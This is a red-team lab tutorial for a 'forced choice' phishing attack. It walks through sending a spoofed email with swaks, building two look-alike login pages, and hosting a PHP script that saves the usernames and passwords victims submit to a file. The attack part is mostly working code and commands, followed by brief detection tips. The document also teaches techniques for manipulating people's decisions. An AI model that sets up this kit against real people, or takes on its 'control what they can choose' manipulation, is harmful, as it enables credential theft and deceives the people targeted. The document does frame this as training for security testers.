## **Law 31 — Control the Options**

Interpretation (offensive context):  
Don’t ask the user _whether_ to act—present **limited choices where every path leads to your objective**. You guide the decision space so the user feels in control, but outcomes are constrained.

---

# 🎯 Attack Scenario — _Forced Choice Phish (All Paths Lead to Credential Capture)_

You present two options—both routes end in the same credential capture workflow, but **framed differently**.

**Persona:**

> _Natalia Ivanova_, 20 y/o IT Coordination Intern

---

# 🔴 Red Team Objective

- Force:
    
    - user decision within **controlled options**
        
- Achieve:
    
    - credential capture regardless of selection
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Controlled Choice Design

You provide **two “valid” options**:

- Option A → Verify access
    
- Option B → Request reset
    

👉 Both routes lead to attacker-controlled interface

---

## Phase 2 — Email Delivery

```bash
swaks --to target@corp.local \
--from natalia.i@corp.local \
--server 192.168.56.101 \
--data "Subject: Account action required

Hi,

Choose one of the following:

1) Verify your account:
http://192.168.56.101:8080/verify

2) Request a reset:
http://192.168.56.101:8080/reset"
```

👉 User thinks:

- “I have control”
    

Reality:

- both paths are controlled
    

---

## Phase 3 — Backend Setup

On Kali:

```bash
mkdir options && cd options
```

### verify page:

```html
<form action="cap.php" method="POST">
<input name="user">
<input type="password" name="pass">
<button>Verify</button>
</form>
```

### reset page:

```html
<form action="cap.php" method="POST">
<input name="user">
<input type="password" name="pass">
<button>Reset</button>
</form>
```

---

### capture:

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Execution

Target:

- chooses option
    
- interacts with system
    
- submits credentials
    

👉 Choice was illusion

---

# 🛠️ Tooling + Commands

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Delivery:

```bash
swaks --to target@corp.local --from natalia.i@corp.local
```

### Logging:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Choice architecture**
    
- **Perceived autonomy**
    
- **Decision manipulation**
    

Key principle:

> People trust decisions they believe they made themselves

---

# 🛡️ Detection & Defensive Insight

Indicators:

- emails offering limited action choices
    
- multiple links leading to similar domains
    
- identical backend behavior
    

Mitigation:

- user training:
    
    - “Choice ≠ legitimacy”
        
- inspect:
    
    - link destinations carefully
        
- enforce:
    
    - official workflows only
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Controlled Decision Path Manipulation

### Include:

- email with dual options
    
- both landing pages
    
- credential capture
    
- analysis:
    
    - illusion of choice
        
- impact:
    
    - guaranteed compromise path
        

---

# ⚠️ Operator Insight

Bad approach:

- ask user to do something
    

Better approach:

- let user choose to do it
    

Best approach:

> control what they can choose

---

